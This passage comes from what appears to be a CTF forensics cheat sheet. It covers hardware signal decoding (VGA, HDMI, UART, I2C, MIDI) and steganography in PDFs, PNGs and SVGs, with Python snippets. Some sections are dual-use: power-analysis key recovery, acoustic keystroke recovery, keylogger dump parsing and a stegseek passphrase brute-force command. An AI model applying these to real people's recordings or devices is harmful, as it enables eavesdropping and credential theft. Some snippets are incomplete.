- [IBM-29 Punched Card OCR (EKOPARTY CTF 2016)](#ibm-29-punched-card-ocr-ekoparty-ctf-2016)
- [Serial UART Data Decoding from WAV Audio (EasyCTF 2017)](#serial-uart-data-decoding-from-wav-audio-easyctf-2017)
- [USB MIDI Launchpad Traffic Reconstruction (Sthack 2017)](#usb-midi-launchpad-traffic-reconstruction-sthack-2017)

---

## VGA Signal Decoding

**Frame structure:** 800x525 total (640x480 active + blanking). Each sample = 5 bytes: R, G, B, HSync, VSync. Color is 6-bit (0-63).

```python
import numpy as np
from PIL import Image

data = open('vga.bin', 'rb').read()

TOTAL_W, TOTAL_H = 800, 525
ACTIVE_W, ACTIVE_H = 640, 480
BYTES_PER_SAMPLE = 5  # R, G, B, hsync, vsync

# Parse raw samples
samples = np.frombuffer(data, dtype=np.uint8).reshape(-1, BYTES_PER_SAMPLE)
frame = samples.reshape(TOTAL_H, TOTAL_W, BYTES_PER_SAMPLE)

# Extract active region, scale 6-bit to 8-bit
active = frame[:ACTIVE_H, :ACTIVE_W, :3]  # RGB only
img_arr = (active.astype(np.uint16) * 4).clip(0, 255).astype(np.uint8)
Image.fromarray(img_arr).save('vga_output.png')
```

**Key lesson:** Total frame > visible area — always crop blanking. If colors look dark, check if 6-bit (multiply by 4).

---

## HDMI TMDS Decoding

**Structure:** 3 channels (R, G, B), each encoded as 10-bit TMDS (Transition-Minimized Differential Signaling) symbols. Bit 9 = inversion flag, bit 8 = XOR/XNOR mode. Decode is deterministic from MSBs down.

```python
def tmds_decode(symbol_10bit):
    """Decode a 10-bit TMDS symbol to 8-bit pixel value."""
    bits = [(symbol_10bit >> i) & 1 for i in range(10)]
    # bits[9] = inversion flag, bits[8] = XOR/XNOR mode

    # Step 1: undo optional inversion (bit 9)
    if bits[9]:
        d = [1 - bits[i] for i in range(8)]
    else:
        d = [bits[i] for i in range(8)]

    # Step 2: undo XOR/XNOR chain (bit 8 selects mode)
    q = [d[0]]
    if bits[8]:
        for i in range(1, 8):
            q.append(d[i] ^ q[i-1])        # XOR mode
    else:
        for i in range(1, 8):
            q.append(d[i] ^ q[i-1] ^ 1)    # XNOR mode

    return sum(q[i] << i for i in range(8))

# Parse: read 10-bit symbols from binary, group into 3 channels
# Frame is 800x525 total, crop to 640x480 active
```

**Identification:** Binary data with 10-bit aligned structure. Challenge mentions HDMI, DVI, or TMDS.

---

## DisplayPort 8b/10b + LFSR Decoding

**Structure:** 10-bit 8b/10b symbols decoded to 8-bit data, then LFSR-descrambled. Organized in 64-column Transport Units (60 data columns + 4 overhead).

```python
# Standard 8b/10b decode table (partial — full table has 256 entries)
# Use a prebuilt table: map 10-bit symbol -> 8-bit data
# Key: running disparity tracks DC balance

# LFSR descrambler (x^16 + x^5 + x^4 + x^3 + 1)
def lfsr_descramble(data):
    """DisplayPort LFSR descrambler. Resets on control symbols (BS/BE)."""
    lfsr = 0xFFFF  # Initial state
    result = []
    for byte in data:
        out = byte
        for bit_idx in range(8):
            feedback = (lfsr >> 15) & 1
            out ^= (feedback << bit_idx)
            new_bit = ((lfsr >> 15) ^ (lfsr >> 4) ^ (lfsr >> 3) ^ (lfsr >> 2)) & 1
            lfsr = ((lfsr << 1) | new_bit) & 0xFFFF
        result.append(out & 0xFF)
    return bytes(result)

# Transport Unit layout: 64 columns per TU
# Columns 0-59: pixel data (RGB)
# Columns 60-63: overhead (sync, stuffing)
# LFSR resets on control bytes (BS=0x1C, BE=0xFB)
```

**Key lesson:** LFSR scrambler resets on control bytes — identify these to synchronize descrambling. Without reset points, output is garbled.

---

## Voyager Golden Record Audio (0xFun 2026)

**Pattern (11 Lines of Contact):** Analog image encoded as audio. Sync pulses (sharp negative spikes) delimit scan lines. Amplitude between pulses = pixel brightness.

```python
import numpy as np
from scipy.io import wavfile
from PIL import Image

rate, audio = wavfile.read('golden_record.wav')
audio = audio.astype(np.float32)

# Find sync pulses (sharp negative spikes below threshold)
threshold = np.min(audio) * 0.7
sync_indices = np.where(audio < threshold)[0]

# Group consecutive sync samples into pulse starts
pulses = [sync_indices[0]]
for i in range(1, len(sync_indices)):
    if sync_indices[i] - sync_indices[i-1] > 100:
        pulses.append(sync_indices[i])

# Extract scan lines between pulses, resample to fixed width
WIDTH = 512
lines = []
for i in range(len(pulses) - 1):
    line = audio[pulses[i]:pulses[i+1]]
    resampled = np.interp(np.linspace(0, len(line)-1, WIDTH), np.arange(len(line)), line)
    lines.append(resampled)

# Normalize and save as image
img_arr = np.array(lines)
img_arr = ((img_arr - img_arr.min()) / (img_arr.max() - img_arr.min()) * 255).astype(np.uint8)
Image.fromarray(img_arr).save('voyager_image.png')
```

---

## Side-Channel Power Analysis (EHAX 2026)

**Pattern (Power Leak):** Power consumption traces recorded during cryptographic operations. Correct key guesses cause measurably different power consumption at specific sample points.

**Data format:** Typically a multi-dimensional array: `[positions × guesses × traces × samples]`. E.g., 6 digit positions × 10 guesses (0-9) × 20 traces × 50 samples.

**Attack (Differential Power Analysis):**
```python
import numpy as np
import hashlib

# Load power traces: shape = (positions, guesses, traces, samples)
data = np.load('power_traces.npy')  # or parse from CSV/JSON
n_positions, n_guesses, n_traces, n_samples = data.shape

# For each position, find the guess with maximum power at the leak point
key_digits = []
for pos in range(n_positions):
    # Average across traces for each guess
    avg_power = data[pos].mean(axis=1)  # shape: (guesses, samples)

    # Find the sample point with maximum power variance across guesses
    # This is the "leak point" where the correct guess stands out
    variance_per_sample = avg_power.var(axis=0)
    leak_sample = np.argmax(variance_per_sample)

    # The guess with maximum power at the leak point is correct
    best_guess = np.argmax(avg_power[:, leak_sample])
    key_digits.append(best_guess)

key = ''.join(str(d) for d in key_digits)
print(f"Recovered key: {key}")

# Flag may be SHA256 of the key
flag = hashlib.sha256(key.encode()).hexdigest()
```

**Identification:** Challenge mentions "power", "side-channel", "leakage", "traces", or "measurements". Data is a multi-dimensional numeric array with axes for positions/guesses/traces/samples.

**Key insight:** The "leak point" is the sample index where correct vs incorrect guesses show the largest power difference. Average across traces first to reduce noise, then find the sample with maximum variance across guesses.

---

## Saleae Logic 2 UART Decode (EHAX 2026)

**Pattern (Baby Serial):** Saleae Logic 2 `.sal` file (ZIP archive) containing digital channel captures. Data encoded as UART serial.

**File structure:** `.sal` is a ZIP containing `digital-0.bin` through `digital-7.bin` + `meta.json`. Only channel 0 typically has data.

**Binary format (digital-*.bin):**
```text
<SALEAE> magic (8 bytes)
version: u32 = 2
type: u32 = 100 (digital)
initial_state: u32 (0 or 1)
... header fields ...
Delta-encoded transitions (variable-length integers)
```

**Delta encoding:** Each value represents the number of samples between state transitions. The signal alternates between HIGH and LOW at each delta.

**UART decode from deltas:**
```python
import numpy as np

# Parse deltas from binary (after header)
# Reconstruct signal timeline
times = np.cumsum(deltas)
states = []
state = initial_state
for d in deltas:
    states.append(state)
    state ^= 1  # toggle on each transition

# UART decode: detect start bit (HIGH→LOW), sample 8 data bits at bit centers
# Baud rate detection: most common delta ≈ samples_per_bit
# At 1MHz sample rate: 115200 baud ≈ 8.7 samples/bit

def uart_decode(transitions, sample_rate=1_000_000, baud=115200):
    bit_period = sample_rate / baud
    bytes_out = []
    i = 0
    while i < len(transitions):
        # Find start bit (falling edge)
        if transitions[i] == 0:  # LOW = start bit
            byte_val = 0
            for bit in range(8):
                sample_time = (1.5 + bit) * bit_period  # center of each bit
                # Sample signal at this offset from start bit
                bit_val = get_signal_at(sample_time)
                byte_val |= (bit_val << bit)  # LSB first
            bytes_out.append(byte_val)
        i += 1
    return bytes(bytes_out)
```

**Common pitfalls:**
- **Inverted polarity:** UART idle is HIGH (mark). If initial_state=1, the encoding may be inverted — try both
- **Baud rate guessing:** Check common rates: 9600, 19200, 38400, 57600, 115200, 230400
- **Output format:** Decoded bytes may be base64-encoded (containing a PNG image or text)
- **Saleae internal format ≠ export format:** The `.sal` internal binary uses a different encoding than CSV/binary export. Parse the raw delta transitions directly

**Quick approach:** Install Saleae Logic 2, open the `.sal` file, add UART analyzer with auto-baud detection, export decoded data.

---

## Flipper Zero .sub File (0xFun 2026)

RAW_Data binary -> filter noise bytes (0x80-0xFF) -> expand batch variable references -> XOR with hint text.

**Key insight:** Flipper Zero `.sub` files contain raw RF signal data. The RAW_Data field encodes binary as pulse timings. Filter out noise bytes (0x80-0xFF), expand any batch variable references, and XOR with hint text from the challenge to recover the flag.

---

## Keyboard Acoustic Side-Channel (ApoorvCTF 2026)

**Pattern (Author on the Run):** Recover typed text from audio recordings of keystrokes. Reference audio provides labeled samples (known keys), flag audio contains unknown keystrokes to classify.

**Step 1 — Detect keystrokes via energy peaks:**
```python
import numpy as np
from scipy.signal import find_peaks
from scipy.io import wavfile

sr, audio = wavfile.read('flag.wav')
if audio.ndim > 1:
    audio = audio.mean(axis=1)

# Sliding window energy envelope (10ms window)
win = int(0.01 * sr)
energy = np.array([np.sum(audio[i:i+win]**2) for i in range(0, len(audio) - win, win)])

# Find peaks with minimum 175ms separation
min_dist = int(0.175 * sr / win)
peaks, _ = find_peaks(energy, height=0.03 * energy.max(), distance=min_dist)
```

**Step 2 — Extract MFCC features per keystroke:**
```python
import librosa

def extract_features(audio, sr, peak_sample, window_ms=10):
    win = int(window_ms / 1000 * sr)
    start = max(0, peak_sample - win // 2)
    segment = audio[start:start + win]
    mfccs = librosa.feature.mfcc(y=segment.astype(float), sr=sr, n_mfcc=20)
    return np.concatenate([mfccs.mean(axis=1), mfccs.std(axis=1)])  # 40-dim
```

**Step 3 — Classify with KNN against labeled reference:**
```python
from sklearn.neighbors import KNeighborsClassifier

# Build reference from labeled audio (26 keys × 50 presses each)
X_ref, y_ref = [], []
for key_idx, key in enumerate('abcdefghijklmnopqrstuvwxyz'):
    for peak in reference_peaks[key_idx * 50:(key_idx + 1) * 50]:
        X_ref.append(extract_features(ref_audio, sr, peak))
        y_ref.append(key)

knn = KNeighborsClassifier(n_neighbors=5)
knn.fit(X_ref, y_ref)

# Classify flag keystrokes
flag = ''.join(knn.predict([extract_features(flag_audio, sr, p) for p in flag_peaks]))
```

**Key insight:** Window size is critical — 10ms captures the initial impact transient which is most distinctive per key. Larger windows (20-30ms) include key release noise that reduces classification accuracy. Use all individual reference samples rather than averaging, as KNN handles variance better with more data points.

**Detection:** Two audio files provided (reference + target), or challenge mentions "typing", "keyboard", "acoustic".

---

## CD Audio Disc Image Steganography (BSidesSF 2026)

**Pattern (cdimage):** Visual images encoded as pit/land patterns on a CD surface. A `.cdda` file (raw CD Digital Audio) contains only two byte values (e.g., `0x0d` and `0xa8`) representing reflective lands and non-reflective pits. When rendered as a spiral on a disc image, the binary pattern forms readable text or images — similar to LightScribe but using the data layer.

**Key components:**
1. **CIRC de-interleaving** — CD audio data is Cross-Interleaved for error correction. The encoding tool (e.g., [arduinocelentano/cdimage](https://github.com/arduinocelentano/cdimage)) pre-interleaves data to compensate. To decode, reverse the CIRC interleaving before rendering.
2. **Spiral geometry** — bytes per track increases linearly: `tr(n) = tr0 + n * dtr`, physical radius `r(n) = r0 + n * dr`. Default params: `tr0=22951.52`, `dtr=1.387`, `r0=24.5mm`.
3. **Polar-to-Cartesian rendering** — accumulate byte values into a polar grid `(radius_pixel, angle_bin)`, then convert to a circular disc image.

**De-interleaving (CIRC reverse):**

```python
import numpy as np

def deinterleave_cdda(data):
    """Reverse CIRC pre-interleaving from cdimage tool."""
    D = 4
    delays = [
        -24*(3),          -24*(1*D+2)+1,    8-24*(2*D+3),    8-24*(3*D+2)+1,
        16-24*(4*D+3),    16-24*(5*D+2)+1,  2-24*(6*D+3),    2-24*(7*D+2)+1,
        10-24*(8*D+3),    10-24*(9*D+2)+1,  18-24*(10*D+3),  18-24*(11*D+2)+1,
        4-24*(16*D+1),    4-24*(17*D)+1,    12-24*(18*D+1),  12-24*(19*D)+1,
        20-24*(20*D+1),   20-24*(21*D)+1,   6-24*(22*D+1),   6-24*(23*D)+1,
        14-24*(24*D+1),   14-24*(25*D)+1,   22-24*(26*D+1),  22-24*(27*D)+1
    ]
    # Build per-output-index offset: output[g*24+i] came from input[g*24+i + offset[i]]
    offsets = [0] * 24
    for pinf in range(24):
        i = delays[pinf] % 24
        if i < 0:
            i += 24
        dg = (i - delays[pinf]) // 24
        offsets[i] = -(111 - dg) * 24 + (pinf - i)

    total = len(data)
    result = np.zeros(total, dtype=np.uint8)
    for i in range(24):
        out_pos = np.arange(i, total, 24, dtype=np.int64)
        in_pos = out_pos + offsets[i]
        valid = (in_pos >= 0) & (in_pos < total)
        result[in_pos[valid]] = data[out_pos[valid]]
    return result
```

**Rendering de-interleaved data to disc image:**

```python
from PIL import Image

def render_cdda_disc(data, img_size=1024, tr0=22951.52052, dtr=1.3865961805,
                     r0=24.5, rcd=57.5, scale=0.115, n_angle_bins=8192,
                     bright_byte=0x0d):
    """Render de-interleaved CDDA data as a circular disc image."""
    center = img_size // 2
    dr = dtr * r0 / tr0
    polar_sum = np.zeros((img_size, n_angle_bins), dtype=np.float64)
    polar_count = np.zeros((img_size, n_angle_bins), dtype=np.float64)

    tr, r, pos, c_float = tr0, r0, 0, 0.0
    total = len(data)
    while c_float < (800 * 1024 * 1024 - tr) and pos < total:
        itr = int(tr)
        r_px = int(r / scale)
        if 0 <= r_px < img_size:
            end = min(pos + itr, total)
            chunk = data[pos:end]
            n_tb = len(chunk)
            if n_tb > 0:
                angles = (np.arange(n_tb, dtype=np.int64) * n_angle_bins // n_tb) % n_angle_bins
                is_bright = (chunk == bright_byte).astype(np.float64)
                np.add.at(polar_sum[r_px], angles, is_bright)
                np.add.at(polar_count[r_px], angles, 1.0)
        c_float += tr
        ic = pos + itr
        while int(c_float) > ic:
            ic += 1
        pos = ic
        tr += dtr
        r += dr

    density = np.where(polar_count > 0, polar_sum / polar_count, 0)
    ys, xs = np.mgrid[0:img_size, 0:img_size]
    dx, dy = (xs - center).astype(float), (ys - center).astype(float)
    r_arr = np.sqrt(dx * dx + dy * dy).astype(int)
    theta = np.arctan2(-dy, dx)
    theta[theta < 0] += 2 * np.pi
    a_idx = (theta / (2 * np.pi) * n_angle_bins).astype(int) % n_angle_bins
    output = density[np.clip(r_arr, 0, img_size - 1), a_idx]
    output[(r_arr < int(r0 / scale)) | (r_arr > int(rcd / scale))] = 0
    return Image.fromarray((output * 255).astype(np.uint8))

# Full pipeline
data = np.fromfile('flag.cdda', dtype=np.uint8)
deinterleaved = deinterleave_cdda(data)
img = render_cdda_disc(deinterleaved)
img.save('disc_output.png')
```

**Key insight:** Without CIRC de-interleaving, the radial structure (bright/dark rings) is visible but angular detail (text) is completely scrambled. The interleaving spreads each byte across ~108 groups (~2592 bytes), which at typical track lengths (~30K-50K bytes/revolution) shifts angular positions by up to 30 degrees — enough to destroy any readable pattern. The calibration image confirms correct decoding by showing known text.

**Calibration workflow:** The challenge provides `calibrate_img.cdda` with a known output (`calibrate_img.png` showing "Calibrate: 0123456789abc..."). Use this pair to verify geometry parameters (tr0, dtr, r0, scale) before decoding the flag file.

**Detection:** Challenge mentions "album", "CD rip", "CDDA", or provides large (~800MB) files with only 2 unique byte values. The `file` command reports "ISO-8859 text with CR line terminators" because `0x0d` (CR) is one of the two values.

---

## Linux input_event Keylogger Dump Parsing (Pwn2Win 2016)

Raw binary dump with 24-byte repeating structure matching Linux's `struct input_event` (`struct timeval` + `__u16 type` + `__u16 code` + `__s32 value`). Filter for `type == EV_KEY (1)` and `value == 1` (key press), map keycodes via Linux kernel's `input-event-codes.h`.

```python
import struct
with open('dump.bin', 'rb') as f:
    while data := f.read(24):
        tv_sec, tv_usec, type_, code, value = struct.unpack('<QQHHi', data)
        if type_ == 1 and value == 1:  # EV_KEY, key press
            print(f"Key code: {code}")  # Map via input-event-codes.h
```

**Key insight:** `/dev/input/event*` captures have a fixed 24-byte `struct input_event` format. Filter EV_KEY type with value=1 for key presses. Map codes using Linux kernel header `input-event-codes.h`.

**Detection:** Binary file size divisible by 24. Challenge mentions keylogger, keyboard, or input device.

---

## I2C Bus Protocol Decoding (EKOPARTY CTF 2016)

Logic analyzer captures of I2C (Inter-Integrated Circuit) bus communications. Decode SDA (data) and SCL (clock) signals to extract transmitted bytes.

```python
def decode_i2c(sda_signal, scl_signal):
    """Decode I2C protocol from logic analyzer capture
    Channel 0 = SDA (data), Channel 1 = SCL (clock)

    I2C framing:
    - START: SDA falls while SCL is high
    - STOP: SDA rises while SCL is high
    - Data: SDA sampled on SCL rising edge
    - ACK: 9th bit (low = ACK, high = NACK)
    """
    bytes_out = []
    current_byte = 0
    bit_count = 0
    in_frame = False

    for i in range(len(scl_signal) - 1):
        # Detect START condition
        if sda_signal[i] == 1 and sda_signal[i+1] == 0 and scl_signal[i] == 1:
            in_frame = True
            bit_count = 0
            current_byte = 0
            continue

        # Detect STOP condition
        if sda_signal[i] == 0 and sda_signal[i+1] == 1 and scl_signal[i] == 1:
            in_frame = False
            continue

        # Sample data on SCL rising edge
        if in_frame and scl_signal[i] == 0 and scl_signal[i+1] == 1:
            if bit_count < 8:
                current_byte = (current_byte << 1) | sda_signal[i+1]
                bit_count += 1
            elif bit_count == 8:
                bytes_out.append(current_byte)
                bit_count = 0
                current_byte = 0

    return bytes_out

# Tools: Saleae Logic 2, sigrok/PulseView, OLS (Open Logic Sniffer)
# Import: File > Open Logic Sniffer capture
# Decode: Analyzers > I2C > Set SDA/SCL channels
```

**Key insight:** I2C uses only 2 wires (SDA + SCL). START/STOP conditions occur when SDA changes while SCL is high. Data bits are sampled on SCL rising edges. Every 9th bit is an ACK. Use logic analyzer software (Saleae, sigrok) for automated decoding.

---

## IBM-29 Punched Card OCR (EKOPARTY CTF 2016)

Decode IBM-29 keypunch card images by detecting hole positions in a standard 80-column x 12-row grid.

```python
from PIL import Image

# IBM-29 character encoding: column punch pattern -> character
IBM_029_MAP = {
    (12,): 'A', (12,1): 'A', (12,2): 'B', (12,3): 'C',  # etc.
    (11,): '-', (11,1): 'J', (11,2): 'K',  # etc.
    (0,): '0', (1,): '1', (2,): '2',  # zone 0 + digit
    # Full mapping: http://www.columbia.edu/cu/computinghistory/029.html
}

def decode_punched_card(image_path, cols=80, rows=12,
                        x_spacing=7, y_spacing=20, x_offset=10, y_offset=10):
    """Detect punches in card image and decode to text"""
    img = Image.open(image_path).convert('L')
    text = ""

    for col in range(cols):
        punches = []
        for row in range(rows):
            x = x_offset + col * x_spacing
            y = y_offset + row * y_spacing
            pixel = img.getpixel((x, y))
            if pixel > 200:  # white = punched hole
                punches.append(row)

        if punches:
            key = tuple(punches)
            text += IBM_029_MAP.get(key, '?')
        else:
            text += ' '

    return text

# Process multiple card images
for i in range(14):
    card_text = decode_punched_card(f'card_{i:02d}.png')
    print(f"Card {i}: {card_text}")
```

**Key insight:** IBM punched cards use a 12-row x 80-column grid. Each character is encoded by 1-3 holes in a column. The grid spacing varies by card reader/scanner resolution -- calibrate by measuring the distance between known reference holes. White/light pixels indicate punched holes.

---

## Serial UART Data Decoding from WAV Audio (EasyCTF 2017)

Audio files can contain serial (UART) data encoded as square wave signals. Decode by sampling amplitude levels and parsing bit timing.

```python
import struct

with open('signal.wav', 'rb') as f:
    f.read(44)  # skip WAV header
    samples = []
    while True:
        data = f.read(2)
        if not data: break
        samples.append(struct.unpack('<h', data)[0])

# Parameters: 9600 baud, 1 start bit, 8 data bits, no parity, 2 stop bits
SAMPLES_PER_BIT = len(samples) // expected_bits  # ~40 for 9600 baud @ 384kHz
THRESHOLD = 0  # above = 1, below = 0

# Convert samples to bits
bits = [1 if s > THRESHOLD else 0 for s in samples]

# Find frames: start bit (0) + 8 data bits + stop bits (1,1)
output = []
i = 0
while i < len(bits) - 11:
    if bits[i] == 0:  # start bit
        byte_bits = bits[i+1:i+9]  # LSB first
        byte_val = sum(b << j for j, b in enumerate(byte_bits))
        output.append(byte_val)
        i += 11  # skip start + 8 data + 2 stop
    else:
        i += 1

print(bytes(output))
```

**Key insight:** UART serial data in audio appears as a square wave with well-defined bit timing. Key parameters to determine: baud rate (samples per bit), frame format (start/stop bits, parity), and bit endianness (UART is LSB-first). The start bit (low) provides synchronization for each byte frame.

**Detection:** WAV file with a clean square wave pattern visible in Audacity. Two distinct amplitude levels with regular timing. Challenge mentions "serial", "UART", "baud", or "RS-232".

---

## USB MIDI Launchpad Traffic Reconstruction (Sthack 2017)

USB traffic from MIDI controller devices (e.g., Novation Launchpad) encodes button presses as MIDI Note On/Off messages that can be reconstructed into visual patterns.

```python
from scapy.all import rdpcap

pkts = rdpcap('capture.pcapng')
# Filter USB bulk transfer packets for MIDI data
# Launchpad MIDI: 0x90 = Note On, 0x80 = Note Off
# Format: [status, key, velocity]
# Key encodes (row, col): key = row*16 + col

characters = []
current_grid = [[0]*8 for _ in range(8)]

for pkt in pkts:
    data = bytes(pkt)
    # Find MIDI messages in USB payload
    if len(data) >= 4:
        status = data[-3]
        key = data[-2]
        velocity = data[-1]

        if status == 0x90 and velocity > 0:  # Note On
            row, col = key // 16, key % 16
            if 0 <= row < 8 and 0 <= col < 8:
                current_grid[row][col] = 1
        elif status == 0x80 or (status == 0x90 and velocity == 0):  # Note Off
            # All-off sequence = character separator
            if all(current_grid[r][c] == 0 for r in range(8) for c in range(8)):
                characters.append(current_grid)
                current_grid = [[0]*8 for _ in range(8)]
```

**Key insight:** MIDI devices use standardized message formats. Novation Launchpad maps its 8x8 grid to MIDI notes where `key = row*16 + col`. Note On (0x90) with velocity > 0 = button lit, Note Off (0x80) = button off. Sequences of all-off messages separate characters displayed on the grid.

**Detection:** USB PCAP with bulk transfer packets containing 3-byte or 4-byte payloads. USB device descriptor shows MIDI class (Audio class, subclass MIDI Streaming). Challenge mentions "MIDI", "Launchpad", "music controller", or "grid".


# steganography

# CTF Forensics - Steganography

Non-image steganography techniques (PDF, SVG, terminal, text, compression, spreadsheet) and general-purpose image stego patterns (PNG structure, file overlays, GIF, autostereograms, interleaving). For image-specific steganography (JPEG DQT/F5/slack, BMP bitplane, PNG palette, pixel permutation, edge matching), see [stego-image.md](stego-image.md). For advanced techniques (FFT, SSTV, audio, video, JPEG XL), see [stego-advanced.md](stego-advanced.md) and [stego-advanced-2.md](stego-advanced-2.md).

## Table of Contents
- [Quick Tools](#quick-tools)
- [Binary Border Steganography](#binary-border-steganography)
- [Multi-Layer PDF Steganography (Pragyan 2026)](#multi-layer-pdf-steganography-pragyan-2026)
- [Advanced PDF Steganography (Nullcon 2026 rdctd series)](#advanced-pdf-steganography-nullcon-2026-rdctd-series)
- [SVG Animation Keyframe Steganography (UTCTF 2024)](#svg-animation-keyframe-steganography-utctf-2024)
- [PNG Chunk Reordering (0xFun 2026)](#png-chunk-reordering-0xfun-2026)
- [File Format Overlays (0xFun 2026)](#file-format-overlays-0xfun-2026)
- [Nested PNG with Iterating XOR Keys (VuwCTF 2025)](#nested-png-with-iterating-xor-keys-vuwctf-2025)
- [GIF Frame Differential + Morse Code (BaltCTF 2013)](#gif-frame-differential--morse-code-baltctf-2013)
- [GZSteg + Spammimic Text Steganography (VolgaCTF 2013)](#gzsteg--spammimic-text-steganography-volgactf-2013)
- [Spreadsheet Frequency Analysis Binary Recovery (Sharif CTF 2016)](#spreadsheet-frequency-analysis-binary-recovery-sharif-ctf-2016)
- [Kitty Terminal Graphics Protocol Decoding (BSidesSF 2026)](#kitty-terminal-graphics-protocol-decoding-bsidessf-2026)
- [ANSI Escape Sequence Steganography in Terminal Art (BSidesSF 2026)](#ansi-escape-sequence-steganography-in-terminal-art-bsidessf-2026)
- [Autostereogram / Magic Eye Solving (BSidesSF 2026)](#autostereogram--magic-eye-solving-bsidessf-2026)
- [Two-Layer Byte+Line Interleaving (BSidesSF 2026)](#two-layer-byteline-interleaving-bsidessf-2026)
- [Progressive PNG Layered XOR Decryption (OpenCTF 2016)](#progressive-png-layered-xor-decryption-openctf-2016)
- [Multi-Stream Video Container Steganography (BSidesSF 2026)](#multi-stream-video-container-steganography-bsidessf-2026)
- [APNG (Animated PNG) Frame Extraction (IceCTF 2016)](#apng-animated-png-frame-extraction-icectf-2016)
- [PNG Height/CRC Manipulation for Hidden Content (H4ckIT CTF 2016)](#png-heightcrc-manipulation-for-hidden-content-h4ckit-ctf-2016)

---

## Quick Tools

```bash
steghide extract -sf image.jpg
zsteg image.png              # PNG/BMP analysis
stegsolve                    # Visual analysis

# Steghide brute-force (0xFun 2026)
stegseek image.jpg rockyou.txt  # Faster than stegcracker
# Common weak passphrases: "simple", "password", "123456"
```

---

## Binary Border Steganography

**Pattern (Framer, PascalCTF 2026):** Message encoded as black/white pixels in 1-pixel border around image.

```python
from PIL import Image

img = Image.open('output.jpg')
w, h = img.size
bits = []

# Read border clockwise: top → right → bottom (reversed) → left (reversed)
for x in range(w): bits.append(0 if sum(img.getpixel((x, 0))[:3]) < 384 else 1)
for y in range(1, h): bits.append(0 if sum(img.getpixel((w-1, y))[:3]) < 384 else 1)
for x in range(w-2, -1, -1): bits.append(0 if sum(img.getpixel((x, h-1))[:3]) < 384 else 1)
for y in range(h-2, 0, -1): bits.append(0 if sum(img.getpixel((0, y))[:3]) < 384 else 1)

# Convert bits to ASCII
msg = ''.join(chr(int(''.join(map(str, bits[i:i+8])), 2)) for i in range(0, len(bits)-7, 8))
```

---

## Multi-Layer PDF Steganography (Pragyan 2026)

**Pattern (epstein files):** Flag hidden across multiple layers in a PDF.

**Layer checklist:**
1. `strings file.pdf | grep -i hidden` -- hidden comments in PDF objects
2. Extract hex strings, try XOR with theme-related keywords
3. Check bytes **after `%%EOF`** marker -- may contain GPG/encrypted data
4. Try ROT18 (ROT13 on letters + ROT5 on digits) as final decode layer

```bash
# Extract post-EOF data
python3 -c "
data = open('file.pdf','rb').read()
eof = data.rfind(b'%%EOF')
print(data[eof+5:].hex())
"
```

---

## Advanced PDF Steganography (Nullcon 2026 rdctd series)

Six distinct hiding techniques in a single PDF:

**1. Invisible text separators:** Underscores rendered as invisible line segments. Extract with `pdftotext -layout` and normalize whitespace to underscores.

**2. URI annotations with escaped braces:** Link annotations contain flag in URI with `\{` and `\}` escapes:
```python
import pikepdf
pdf = pikepdf.Pdf.open(pdf_path)
for page in pdf.pages:
    for annot in (page.get("/Annots") or []):
        obj = annot.get_object()
        if obj.get("/Subtype") == pikepdf.Name("/Link"):
            uri = str(obj.get("/A").get("/URI")).replace(r"\{", "{").replace(r"\}", "}")
            # Check for flag pattern
```

**3. Blurred/redacted image with Wiener deconvolution:**
```python
from skimage.restoration import wiener
import numpy as np

def gaussian_psf(sigma):
    k = int(sigma * 6 + 1) | 1
    ax = np.arange(-(k//2), k//2 + 1, dtype=np.float32)
    xx, yy = np.meshgrid(ax, ax)
    psf = np.exp(-(xx**2 + yy**2) / (2 * sigma * sigma))
    return psf / psf.sum()

img_arr = np.asarray(img.convert("L")).astype(np.float32) / 255.0
deconv = wiener(img_arr, gaussian_psf(3.0), balance=0.003, clip=False)
```

**4. Vector rectangle QR code:** Hundreds of tiny filled rectangles (e.g., 1.718x1.718 units) forming a QR code. Parse PDF content stream for `re` operators, extract centers, render as grid, decode with `zbarimg`.

**5. Compressed object streams:** Use `mutool clean -d -c -m input.pdf output.pdf` to decompress all streams, then `strings` to search.

**6. Document metadata:** Check Producer, Author, Keywords fields: `pdfinfo doc.pdf` or `exiftool doc.pdf`.

**Official writeup details (Nullcon 2026 rdctd 1-6):**
- **rdctd 1:** Flag is visible in plain text (Section 3.4)
- **rdctd 2:** Flag in hyperlink URI with escaped braces (`\{`, `\}`)
- **rdctd 3:** LSB stego in Blue channel, **bit plane 5** (not bit 0!). Use `zsteg` with all planes: `zsteg -a extracted.ppm | grep ENO`
- **rdctd 4:** QR code hidden under black redaction box. Use Master PDF Editor to remove the box, scan QR
- **rdctd 5:** Flag in FlateDecode compressed stream (not visible with `strings`):
  ```python
  import re, zlib
  pdf = open('file.pdf', 'rb').read()
  for s in re.findall(b'stream[\r\n]+(.*?)[\r\n]+endstream', pdf, re.S):
      try:
          dec = zlib.decompress(s)
          if b'ENO{' in dec: print(dec)
      except: pass
  ```
- **rdctd 6:** Flag in `/Producer` metadata field

**Comprehensive PDF flag hunt checklist:**
1. `strings -a file.pdf | grep -o 'FLAG_FORMAT{[^}]*}'`
2. `exiftool file.pdf` (all metadata fields)
3. `pdfimages -all file.pdf img` + `zsteg -a img-*.ppm`
4. Open in PDF editor, check for overlay/redaction boxes hiding content
5. Decompress FlateDecode streams and search
6. Parse link annotations for URIs with escaped characters
7. `mutool clean -d file.pdf clean.pdf && strings clean.pdf`

---

## SVG Animation Keyframe Steganography (UTCTF 2024)

**Pattern (Insanity Check):** SVG favicon contains animation keyframes with alternating fill colors.

**Encoding:** `#FFFF` = 1, `#FFF6` = 0. Timing intervals (~0.314s or 3x0.314s) encode Morse code dots/dashes.

**Detection:** SVG files with `<animate>` tags, `keyTimes`/`values` attributes. Check favicon.svg and other vector assets. Two-value alternation patterns encode binary or Morse.

---

## APNG (Animated PNG) Frame Extraction (IceCTF 2016)

APNG files contain multiple frames within a standard PNG container. Tools like `tweakpng` or `apngdis` extract individual frames that may contain hidden data.

```bash
# Check if PNG is actually APNG (contains acTL chunk)
python3 -c "
import struct
with open('image.png', 'rb') as f:
    data = f.read()
    if b'acTL' in data:
        print('APNG detected!')
        idx = data.index(b'acTL')
        num_frames = struct.unpack('>I', data[idx+4:idx+8])[0]
        print(f'Number of frames: {num_frames}')
"

# Extract frames using apngdis
apngdis image.apng  # produces frame_01.png, frame_02.png, ...

# Alternative: use PHP or Python libraries
# pip install apng
python3 -c "
from apng import APNG
im = APNG.open('image.apng')
for i, (png, control) in enumerate(im.frames):
    png.save(f'frame_{i:02d}.png')
"
```

